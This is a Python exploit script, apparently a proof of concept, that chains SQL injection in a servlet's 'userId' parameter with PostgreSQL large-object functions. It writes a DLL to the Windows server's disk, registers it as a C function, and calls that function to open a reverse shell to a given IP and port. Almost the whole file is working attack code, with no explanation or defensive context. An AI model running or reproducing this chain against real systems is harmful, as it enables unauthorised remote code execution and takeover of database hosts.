#
#

def make_request(url, sql):
    r = requests.get( url % sql, verify=False, proxies=proxyDict)
    return r
 
def delete_lo(url):
    sql = "SELECT lo_unlink((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%25$$ LIMIT 1))"
    make_request(url, sql)

def create_lo(url):
    sql = "SELECT lo_import($$C:\\windows\\win.ini$$)"
    make_request(url, sql)
    
def inject_udf(url):
    for i in range(0,int(round(len(udf)/4096))):    
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=(select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$; for%%25$$ LIMIT 1) and pageno=%d" % (udf_chunk, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%%25$$ LIMIT 1), %d,decode($$%s$$, $$hex$$))" % (i, udf_chunk)
        make_request(url, sql)
        
        
def export_udf(url):
    sql = "SELECT lo_export((select loid from pg_largeobject where encode(data, $$escape$$) LIKE $$MZ%25$$ LIMIT 1), $$C:\\Users\\frank\\rev_shell.dll$$)"
    make_request(url, sql)

def create_udf_func(url):
    sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\frank\\rev_shell.dll$$, $$connect_back$$ language C strict"
    make_request(url, sql)    
    
def trigger_udf(url, ip, port):
    sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
    make_request(url, sql)
    
if __name__ == '__main__':
    server = sys.argv[1].strip()
    user = sys.argv[2].strip()
    port = sys.argv[3].strip()
    
sqli_url = "https://"+server+"/testingServlet?userdata=1&userId=1;%s;--"
delete_lo(sqli_url)
create_lo(sqli_url)
inject_udf(sqli_url)
export_udf(sqli_url)
create_udf_func(sqli_url)
trigger_udf(sqli_url, user, port)